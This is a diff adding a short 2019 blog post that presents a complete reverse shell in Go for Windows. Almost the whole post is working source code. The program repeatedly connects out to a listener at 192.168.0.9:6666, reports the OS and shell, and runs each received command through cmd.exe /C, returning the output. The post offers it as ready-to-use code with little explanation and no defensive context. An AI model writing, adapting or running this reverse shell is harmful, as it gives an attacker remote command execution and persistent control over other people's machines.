@@ -1,0 +1,64 @@
+---
+layout: post
+title: "A Simple Reverse Shell In Golang 🐚"
+date: 2019-07-16 12:00:00 -0700
+categories: go golang reverse shell infosec
+published: true
+---
+
+This article assumes programming proficiency in `Golang` and familiarity with network programming concepts such as TCP/IP & sockets.
+
+## **Shell Shoveling In Golang**
+
+This is a simple example of a reverse shell written in the programming language `Go` for the windows operating system.
+
+```go
+
+package main
+
+import (
+    "bufio"
+    "fmt"
+    "net"
+    "os"
+    "os/exec"
+    "runtime"
+    "strings"
+    "time"
+)
+
+func main() {
+    for {
+        conn, err := net.Dial("tcp", "192.168.0.9:6666")
+        if err != nil {
+            time.Sleep(10 * time.Second)
+            continue
+        }
+        fmt.Fprintf(conn, "\nOS: %s\nArchitecture: %s\n", runtime.GOOS, runtime.GOARCH)
+        shell := os.Getenv("ComSpec")
+        fmt.Fprintf(conn, "shell: %s\n\n", shell)
+
+        scanner := bufio.NewScanner(conn)
+        for scanner.Scan() {
+            data := scanner.Text()
+            out, _ := exec.Command(
+                shell,
+                append(
+                    []string{"/C"},
+                    // strings.Split(strings.TrimSpace(data), " ")...,
+                    strings.TrimSpace(data),
+                )...,
+            ).CombinedOutput()
+
+            fmt.Fprintf(conn, "\n%s\n", string(out))
+        }
+
+        if err := scanner.Err(); err != nil {
+            fmt.Fprintf(conn, "\nError: %s ...\n", err)
+        }
+
+        time.Sleep(5 * time.Second)
+    }
+}
+
+```
